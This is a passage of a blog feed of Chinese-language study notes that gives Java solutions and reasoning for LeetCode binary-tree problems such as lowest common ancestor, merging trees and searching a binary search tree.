class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; res.size();i++) &#123;</span><br><span class="line">            result[i] = res.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">findMode1</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        findMode1(root.left);</span><br><span class="line">        <span class="keyword">if</span>(pre == <span class="literal">null</span> || pre.val != root.val) &#123;</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count &gt; maxCount) &#123;</span><br><span class="line">            <span class="comment">//清除后更新</span></span><br><span class="line">            res.clear();</span><br><span class="line">            res.add(root.val);</span><br><span class="line">            maxCount = count;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(count == maxCount) &#123;</span><br><span class="line">            res.add(root.val);</span><br><span class="line">        &#125;</span><br><span class="line">        pre = root;</span><br><span class="line">        findMode1(root.right);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树的最近公共祖先"><a href="#二叉搜索树的最近公共祖先" class="headerlink" title="二叉搜索树的最近公共祖先"></a>二叉搜索树的最近公共祖先</h4><p>link:<a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/description/">236. 二叉树的最近公共祖先 - 力扣（LeetCode）</a></p><h5 id="思路分析-3"><a href="#思路分析-3" class="headerlink" title="思路分析"></a>思路分析</h5><p>可以使用两个栈来存储从根节点到 <code>p</code> 和 <code>q</code> 的路径，然后通过比较这两个路径来找到它们的最低公共祖先</p><h6 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">getPath</span><span class="params">(TreeNode root, TreeNode node, Stack&lt;TreeNode&gt; stack)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span> || node == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stack.push(root);</span><br><span class="line">    <span class="keyword">if</span> (root == node) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flg</span> <span class="operator">=</span> getPath(root.left, node, stack);</span><br><span class="line">    <span class="keyword">if</span> (flg) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flg2</span> <span class="operator">=</span> getPath(root.right, node, stack);</span><br><span class="line">    <span class="keyword">if</span> (flg2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stack.pop();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Stack&lt;TreeNode&gt; stackP = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stackQ = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    getPath(root, p, stackP);</span><br><span class="line">    getPath(root, q, stackQ);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">sizeP</span> <span class="operator">=</span> stackP.size();</span><br><span class="line">    <span class="type">int</span> <span class="variable">sizeQ</span> <span class="operator">=</span> stackQ.size();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sizeP &gt; sizeQ) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> sizeP - sizeQ;</span><br><span class="line">        <span class="keyword">while</span> (size != <span class="number">0</span>) &#123;</span><br><span class="line">            stackP.pop();</span><br><span class="line">            size--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> sizeQ - sizeP;</span><br><span class="line">        <span class="keyword">while</span> (size != <span class="number">0</span>) &#123;</span><br><span class="line">            stackQ.pop();</span><br><span class="line">            size--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stackP.isEmpty() &amp;&amp; !stackQ.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stackP.peek().equals(stackQ.peek())) &#123;</span><br><span class="line">            <span class="keyword">return</span> stackP.peek();</span><br><span class="line">        &#125;</span><br><span class="line">        stackP.pop();</span><br><span class="line">        stackQ.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="DFS（后序遍历）"><a href="#DFS（后序遍历）" class="headerlink" title="DFS（后序遍历）"></a>DFS（后序遍历）</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span> || root == p || root == q) &#123; <span class="comment">// 递归结束条件</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后序遍历</span></span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123; <span class="comment">// 若未找到节点 p 或 q</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left == <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) &#123; <span class="comment">// 若找到一个节点</span></span><br><span class="line">        <span class="keyword">return</span> right;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left != <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123; <span class="comment">// 若找到一个节点</span></span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 若找到两个节点</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x13</title>
      <link href="/2024/11/13/yub%E3%81%AEAlgorithm.0x13/"/>
      <url>/2024/11/13/yub%E3%81%AEAlgorithm.0x13/</url>
      
        <content type="html"><![CDATA[<h4 id="最大二叉树"><a href="#最大二叉树" class="headerlink" title="最大二叉树"></a>最大二叉树</h4><p>link：<a href="https://leetcode.cn/problems/maximum-binary-tree/description/">654. 最大二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>在数组中遍历找到最大值（根节点），分割得到左右子树，再回溯遍历左右子树（还是先找到最大值作为子树的根节点再遍历）</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">constructMaximumBinaryTree</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> constructMaximumBinaryTree1(nums,<span class="number">0</span>,nums.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">constructMaximumBinaryTree1</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> leftIndex, <span class="type">int</span> rightIndex)</span> &#123;</span><br><span class="line">        <span class="comment">//没有元素了</span></span><br><span class="line">        <span class="keyword">if</span>(rightIndex - leftIndex == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//只有一个元素 直接加入</span></span><br><span class="line">        <span class="keyword">if</span>(rightIndex - leftIndex == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>  <span class="keyword">new</span> <span class="title class_">TreeNode</span>(nums[leftIndex]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxIndex</span> <span class="operator">=</span> leftIndex;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> nums[leftIndex];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> leftIndex; i &lt; rightIndex; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; maxVal) &#123;</span><br><span class="line">                maxVal = nums[i];</span><br><span class="line">                maxIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(maxVal);</span><br><span class="line">        <span class="comment">//划分左右子树</span></span><br><span class="line">        root.left = constructMaximumBinaryTree1(nums,leftIndex,maxIndex);</span><br><span class="line">        root.right = constructMaximumBinaryTree1(nums,maxIndex + <span class="number">1</span>,rightIndex);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><p><strong>左闭右开区间的优点</strong><br>1.简化边界处理：使用左闭右开区间 <code>[leftIndex, rightIndex)</code> 意味着 <code>rightIndex</code> 是<strong>不包含的结束边界</strong>.</p><p>2.递归的分区更直观：分区时可以直接用 <code>leftIndex</code> 到 <code>maxIndex</code> 和 <code>maxIndex + 1</code> 到 <code>rightIndex</code>，无需额外调整索引。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root.left = constructMaximumBinaryTree1(nums, leftIndex, maxIndex);</span><br><span class="line">root.right = constructMaximumBinaryTree1(nums, maxIndex + <span class="number">1</span>, rightIndex);</span><br></pre></td></tr></table></figure><p>3.避免边界错误：半开区间让右边界始终指向范围的下一个位置，避免了因“是否包含结束位置”而导致的边界错误，尤其在处理数组下标时可以减少出错的风险.</p><h4 id="合并二叉树"><a href="#合并二叉树" class="headerlink" title="合并二叉树"></a>合并二叉树</h4><p>link：<a href="https://leetcode.cn/problems/merge-two-binary-trees/description/">617. 合并二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>虽然题目说了合并过程必须从根节点开始，但是我们给定的数据内容已经满足条件（hh 冤大头 还想着要先判断一下大小）<br>直接无脑加就是了，主要就是判空递归.</p><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mergeTrees</span><span class="params">(TreeNode root1, TreeNode root2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root1;</span><br><span class="line">        &#125;</span><br><span class="line">        root1.val += root2.val;</span><br><span class="line">        <span class="comment">//递归</span></span><br><span class="line">        root1.left = mergeTrees(root1.left,root2.left);</span><br><span class="line">        root1.right = mergeTrees(root1.right,root2.right);</span><br><span class="line">        <span class="keyword">return</span> root1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树中的搜索"><a href="#二叉搜索树中的搜索" class="headerlink" title="二叉搜索树中的搜索"></a>二叉搜索树中的搜索</h4><p>link：<a href="https://leetcode.cn/problems/search-in-a-binary-search-tree/description/">700. 二叉搜索树中的搜索 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>因为给的是二叉搜索树，最邻近的左子树根节点比root小，最邻近的右子树根节点比root大，所以用val和跟root比较，再遍历递归对应的子树即可.（相当于左右划分）</p><h6 id="递归-2"><a href="#递归-2" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">searchBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">         <span class="keyword">if</span>(root == <span class="literal">null</span> || root.val == val) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &lt; root.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> searchBST(root.left, val);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> searchBST(root.right, val);</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">searchBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(root != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(val &lt; root.val)&#123;</span><br><span class="line">                root = root.left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(val &gt; root.val) &#123;</span><br><span class="line">                root = root.right;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x12</title>
      <link href="/2024/11/10/yub%E3%81%AEAlgorithm.0x12/"/>
      <url>/2024/11/10/yub%E3%81%AEAlgorithm.0x12/</url>
      
        <content type="html"><![CDATA[<h4 id="找树左下角的值"><a href="#找树左下角的值" class="headerlink" title="找树左下角的值"></a>找树左下角的值</h4><p>link：<a href="https://leetcode.cn/problems/find-bottom-left-tree-value/description/">513. 找树左下角的值 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>看题目给出的样例分析，觉得可以从深度入手.如果是左子树深度最大，那直接输出最左边的左子树节点即可（只有一个左节点的话也是如出一辙）<br>又假设二叉树中至少有一个节点，就已经列举出一种特殊需要判断的情况了.</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//定义为-1 确保只有一个节点时也能成功遍历</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">Deepth</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">         result = root.val;</span><br><span class="line">         exrloration(root,<span class="number">0</span>);</span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exrloration</span><span class="params">(TreeNode node,<span class="type">int</span> deepth)</span> &#123;</span><br><span class="line">        <span class="comment">//其实题目描述已经避免这种情况了</span></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(deepth &gt; Deepth) &#123;</span><br><span class="line">                Deepth = deepth;</span><br><span class="line">                result = node.val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">               exrloration(node.left,deepth+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">               <span class="keyword">if</span>(node.right!= <span class="literal">null</span>) &#123;</span><br><span class="line">               exrloration(node.right,deepth+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="路径总和"><a href="#路径总和" class="headerlink" title="路径总和"></a>路径总和</h4><p>link：<a href="https://leetcode.cn/problems/path-sum/description/">112. 路径总和 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>类似数组遍历求和（滑动窗口）找目标总和值只不过换成二叉树.<br>首先还是想到按照前序遍历的方式，递归遍历.由于根节点是一定要选中的，(null另算)那我们遍历子节点做差判断最后是否等于0即可.<br>或者可以从下向上按照层，借助队列实现二叉树版滑动窗口.🤔</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 